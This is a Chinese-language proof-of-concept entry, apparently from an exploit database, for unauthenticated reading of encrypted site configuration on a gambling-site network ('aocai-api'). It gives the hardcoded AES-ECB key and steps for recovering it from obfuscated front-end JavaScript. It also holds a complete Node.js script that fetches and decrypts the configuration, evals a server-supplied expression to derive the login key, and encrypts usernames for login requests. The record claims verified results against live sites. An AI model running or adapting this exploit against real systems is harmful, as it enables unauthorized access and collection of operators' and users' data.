# 菠菜站群 aocai-api 未授权读取加密站点配置（AES-ECB 密钥硬编码于前端 app.js）

- **code**: 菠菜站群-aocai-api-未授权读取加密站点配置-aes-ecb-密钥硬编码于前端-app.js
- **kind**: poc
- **category**: unauthorized
- **component**: 菠菜站群 prodSite5 / aocai-api（Tomcat）
- **versions**: prodSite5 模板（app.js 构建号 20261001180821/20261001142129）
- **severity**: high
- **language**: js
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测：用 key "a6bqLk97V45jXVmj" 解密 /aocai-api/getWebConfigNew 的 3008 字节 base64 响应，得到 2104 字节 JSON，含 title=尊彩9388、webConfig.key、androidLink、onlineKefus（4 个客服域名）、webUnavailable（5 个兄弟站备用域名）、logo 存储路径。同站 getBanks 未授权返回 80+ 家银行列表，getRegisterParams 未授权返回注册策略。加密 username 后请求 login，服务端响应由 e00006 变为 e00129，证明参数格式被正确解析。全程无需任何凭据。
- **path**: pocs/菠菜站群-aocai-api-未授权读取加密站点配置-aes-ecb-密钥硬编码于前端-app.js/poc.js
- **tags**: 菠菜站群,prodSite5,aocai-api,Tomcat,未授权访问,AES,前端加密破解,信息泄露
- **created_at**: 2026-10-04T09:09:34.234Z
- **found_by**: recon

## 描述

该站群（prodSite5 模板 + aocai-api 网关，Tomcat 后端）的 /aocai-api/getWebConfigNew 接口无需任何鉴权即可访问，但响应体用 AES-128-ECB/Pkcs7 做了加密；同时 getBanks、getRegisterParams 同样未授权可读。加密 key 由前端 app.js 里三个模块级常量 m/o/q 拼接而成。解密后可拿到站点全量配置：品牌名、APP 下载地址、全套客服域名、站群兄弟站备用域名、图片存储与「管理端(mgr)上传目录」路径，以及用于加密登录 username 的 keyf（可自举派生）。

## 用法

```
1) 替换 HOST 为目标站群任意域名（同套系统均可用）；
2) node poc.js [待加密的 username]
3) 密钥提取方法：对目标站 /wap/ 的 app.js 做 obfuscator.io 字符串表还原，在 sD 函数所在模块里找 m/o/q 三个常量，拼接即响应解密 key；配置里的 data.key 是 keyf 表达式，eval 后与自身前 16 字节拼接即登录加密 key。
```

## 正文

```
#!/usr/bin/env node
// 未授权解密站点全量配置 + 派生登录加密 key
'use strict';
const crypto = require('crypto');
const https = require('https');

const CFG_KEY = 'a6bqLk97V45jXVmj'; // m+o+q，来自 app.js 模块级常量

function aesDec(ctB64, keyStr) {
  let kb = Buffer.from(keyStr, 'utf8').slice(0, 32);
  if (keyStr.length < 4) kb = Buffer.from(keyStr + 'kvsL', 'utf8');
  if (![16, 24, 32].includes(kb.length)) kb = kb.slice(0, 16);
  const d = crypto.createDecipheriv('aes-' + kb.length * 8 + '-ecb', kb, null);
  d.setAutoPadding(false);
  let out = Buffer.concat([d.update(Buffer.from(ctB64, 'base64')), d.final()]);
  const pad = out[out.length - 1];
  if (pad > 0 && pad <= 16) out = out.slice(0, out.length - pad);
  return out.toString('utf8');
}
function aesEnc(pt, keyStr) {
  let kb = Buffer.from(keyStr, 'utf8').slice(0, 32);
  if (![16, 24, 32].includes(kb.length)) kb = kb.slice(0, 16);
  const c = crypto.createCipheriv('aes-' + kb.length * 8 + '-ecb', kb, null);
  c.setAutoPadding(false);
  let b = Buffer.from(String(pt), 'utf8');
  const p = 16 - (b.length % 16);
  b = Buffer.concat([b, Buffer.alloc(p, p)]);
  return Buffer.concat([c.update(b), c.final()]).toString('base64');
}

const HOST = 'example.com';
const H = { 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            Accept: 'application/json, text/plain, */*',
            Referer: `https://${HOST}/wap/`, 'X-Requested-With': 'XMLHttpRequest' };

function get(path) {
  return new Promise((res, rej) => {
    https.get({ host: HOST, path, headers: H, rejectUnauthorized: false }, s => {
      let d = ''; s.on('data', c => d += c); s.on('end', () => res(d));
    }).on('error', rej);
  });
}

(async () => {
  const raw = (await get('/aocai-api/getWebConfigNew')).trim().replace(/^"|"$/g, '');
  const cfg = JSON.parse(aesDec(raw, CFG_KEY));
  console.log(JSON.stringify(cfg.data, null, 1));
  const keyf = cfg.data.key;
  const loginKey = String(eval(keyf)) + String(keyf).substring(0, 16);
  console.log('login key =', loginKey);
  console.log('username 密文 =', aesEnc(process.argv[2] || 'test', loginKey));
})();
```
